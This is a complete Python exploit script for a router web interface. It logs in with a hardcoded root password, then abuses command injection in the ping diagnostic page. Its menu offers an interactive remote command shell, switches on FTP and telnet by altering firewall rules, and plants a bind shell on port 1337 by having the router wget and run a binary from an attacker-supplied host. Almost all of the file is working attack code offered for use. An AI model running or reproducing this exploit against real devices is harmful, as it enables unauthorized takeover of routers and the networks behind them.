#!/usr/bin/python

import urllib, re, time, os, sys, urllib2, commands 

username = "root"
password = "W!n0&oO7."

# --------------------------------------------------
#  Default 'admin' account credentials
# -------------------------------------------------
#username = "admin"
#password = "admin"


## 
RED 	= '\033[31m'
GREEN 	= '\033[32m'
RESET 	= '\033[0;0m'
##

try:
	target = sys.argv[1]
	if target[:7] != "http://":
		target = "http://"+target
	try:

		response = urllib.urlopen(target)
		html_data = response.read()
		sys.stdout.write(" [*] Retrieving random login token...\r")
		sys.stdout.flush()
		time.sleep(3)

		# Checking for random Login token
		Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', html_data)
		if Frm_Logintoken :
			sys.stdout.write("					["+GREEN+" OK "+RESET+"]\n")
			time.sleep(1)
			Frm_Logintoken = str(Frm_Logintoken[0])

			# Login with root credentials
			do_login =[('Frm_Logintoken',Frm_Logintoken),('Username',username),('Password',password)]
			do_login = urllib.urlencode(do_login)
			page = target+"/login.gch" 
			request = urllib2.Request(page, do_login)
			response = urllib2.urlopen(request)
			html_data = response.read()

			# Check router information on "template.gch" page
			info = target+"/template.gch"
			response = urllib.urlopen(info)
			html_data = response.read()
			print "   [*] Login token: "+GREEN+Frm_Logintoken+RESET

			# Check for Model Name
			Frm_ModelName  = re.findall(r'Frm_ModelName" class="tdright">(.*)<', html_data)
			if Frm_ModelName :
				Frm_ModelName = str(Frm_ModelName[0])
				print "   [*] Model Name: "+GREEN+Frm_ModelName+RESET

			# Check for Serial Number
			Frm_SerialNumber  = re.findall(r'Frm_SerialNumber" class="tdright">(.*)', html_data)
			if Frm_SerialNumber :
				Frm_SerialNumber = str(Frm_SerialNumber[0])
				print "   [*] Serial Number: "+GREEN+Frm_SerialNumber+RESET

			# Check for Hardware Version
			Frm_SoftwareVerExtent  = re.findall(r'Frm_SoftwareVerExtent" class="tdright">(.*)<', html_data)
			if Frm_SoftwareVerExtent :
				Frm_SoftwareVerExtent = str(Frm_SoftwareVerExtent[0])
				print "   [*] Hardware Version: "+GREEN+Frm_SoftwareVerExtent+RESET

			# Check for Software Version
			Frm_HardwareVer  = re.findall(r'Frm_HardwareVer" class="tdright">(.*)<', html_data)
			if Frm_HardwareVer :
				Frm_HardwareVer = str(Frm_HardwareVer[0])
				print "   [*] Software Version: "+GREEN+Frm_HardwareVer+RESET

			# Check for Boot Loader Version
			Frm_BootVer  = re.findall(r'Frm_BootVer"  class="tdright">(.*)<', html_data)
			if Frm_BootVer :
				Frm_BootVer= str(Frm_BootVer[0])
				print "   [*] Boot Loader Version: "+GREEN+Frm_BootVer+RESET

			# Main menu
			print"\nWelcome to main menu:"
			print"  1. Pseudo-Terminal access."
			print"  2. Enable FTP access."
			print"  3. Enable TELNET access."
			print"  4. Bind shell on port 1337."
			print"  5. Quit."

			while True:
				choice = raw_input("\nEnter your choice: ")

				if choice == "1":
					print "\nPseudo-Terminal (type 'q' for quit)"
					print "Enter your command:"
					while True:
						cmd = raw_input("# ")
						if cmd == "q":
							sys.exit(1)
						else:
							payload = "/getpage.gch%3Fpid%3D1002%26nextpage%3Dmanager_dev_ping_t.gch%26Host%3D%3Becho+%24("+cmd+")%26NumofRepeat%3D1%26DataBlockSize%3D64%26DiagnosticsState%3DRequested%26IF_ACTION%3Dnew%26IF_IDLE%3Dsubmit"

							exploit = target + payload
							response = urllib.urlopen(exploit)
							time.sleep(3)
							html_data = response.read()

							page  = target+"/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch"
							response = urllib.urlopen(page)
							html_data = response.read()

							# Check for response on given command
							shell = re.findall(r'textarea_1">(.*) -c', html_data)
							if shell:	
								print shell
							else:
								shell1 = re.findall(r'textarea_1">(.*)', html_data)
								if shell1[0] == "-c 1 -s 64":
									print "No response on '"+cmd+"' command!"
								else:
									shell2 = re.findall(r'(.*) -c', html_data)
									shell = shell1+shell2
									if shell[0] != "</textarea>":
										print shell
									else:
										print "No response on '"+cmd+"' command!"

				elif choice == "2":
					print "\nPlease wait..." 
					print "Enabling FTP deamon on "+target+"...\n"

					# Enable vsftpd on target
					cmd = "vsftpd start" 
					payload = "/getpage.gch%3Fpid%3D1002%26nextpage%3Dmanager_dev_ping_t.gch%26Host%3D%3B"+cmd+"%26NumofRepeat%3D1%26DataBlockSize%3D64%26DiagnosticsState%3DRequested%26IF_ACTION%3Dnew%26IF_IDLE%3Dsubmit"

					enable_ftp = target + payload
					response = urllib.urlopen(enable_ftp)
					time.sleep(10)
					html_data = response.read()
					time.sleep(5)
					target = target.replace('http://','')
					os.system("ftp "+str(target))
					sys.exit(1)

				elif choice == "3":
					print "\nPlease wait..."
					print "Enabling TELNET deamon on "+target+"...\n"
					
					# Enable telnet on target
					payload = "/getpage.gch%3Fpid%3D1002%26nextpage%3Dsec_sc_t.gch%26IF_ACTION%3Dapply%26IF_ERRORSTR%3DSUCC%26IF_ERRORPARAM%3DSUCC%26IF_ERRORTYPE%3D-1%26ViewName%3DNULL%26Enable%3D1%26INCViewName%3DIGD.LD1%26INCName%3DLAN%26MinSrcIp%3D0.0.0.0%26MinSrcMask%3DNULL%26MaxSrcIp%3D0.0.0.0%26FilterTarget%3D1%26Servise%3D8%26ViewName0%3DIGD.FWSc.FWSC1%26Enable0%3D1%26INCViewName0%3DIGD.WANIF%26INCName0%3DWAN%26MinSrcIp0%3D%26MinSrcMask0%3D0.0.0.0%26MaxSrcIp0%3D%26FilterTarget0%3D1%26Servise0%3D1%26ViewName1%3DIGD.FWSc.FWSC2%26Enable1%3D1%26INCViewName1%3DIGD.LD1%26INCName1%3DLAN%26MinSrcIp1%3D%26MinSrcMask1%3D0.0.0.0%26MaxSrcIp1%3D%26FilterTarget1%3D0%26Servise1%3D8%26ViewName2%3DIGD.FWSc.FWSC3%26Enable2%3D1%26INCViewName2%3DIGD.WANIF%26INCName2%3DWAN%26MinSrcIp2%3D%26MinSrcMask2%3D0.0.0.0%26MaxSrcIp2%3D%26FilterTarget2%3D1%26Servise2%3D8%26IF_INDEX%3D1%26IF_INSTNUM%3D3"

					enable_telnet = target + payload
					resonse = urllib.urlopen(enable_telnet)
					time.sleep(10)
					html_data = response.read()
					time.sleep(5)
					target = target.replace('http://','')
					os.system("telnet "+str(target))
					sys.exit(1)

				elif choice == "4":
					host 	= raw_input("\nEnter your local address\n> ")
					if host[:7] != "http://":
						host = "http://"+host
					os.system("cp shell /var/www/")
					print "\nChecking apache2 service state..."
					os.system("service apache2 restart  >/dev/null 2>&1")

					print "Please wait for bind shell on port 1337...\n"
					
					# Uploading special bind shell on target
					cmd = "cd /tmp; wget "+host+"/shell; chmod 777 shell; ./shell; echo $(ls)" 
					payload = "/getpage.gch%3Fpid%3D1002%26nextpage%3Dmanager_dev_ping_t.gch%26Host%3D%3B"+cmd+"%26NumofRepeat%3D1%26DataBlockSize%3D64%26DiagnosticsState%3DRequested%26IF_ACTION%3Dnew%26IF_IDLE%3Dsubmit"

					bind_shell = target + payload
					response = urllib.urlopen(bind_shell)
					time.sleep(10)
					html_data = response.read()
					time.sleep(5)
					target = target.replace('http://','')

					res1 = commands.getoutput("nc -z -v "+str(target)+ " 1337")
					res = re.findall(r'open', res1)
					if res:
						print "Woohoo! Got bind shell on port 1337..."
						os.system("nc "+str(target)+" 1337")
					else:
						print "Bind shell connection failed!"
					sys.exit(1)

				elif choice == "5":
					print("Goodbye.")
					sys.exit(1)
				else:
					print("Wrong Option!") 
					
		else:
			sys.stdout.write("					["+RED+" FALSE "+RESET+"]\n")

	except IOError, e:
		print "Failed to connect on "+target

except (KeyboardInterrupt, SystemExit):
        print ""

# EOF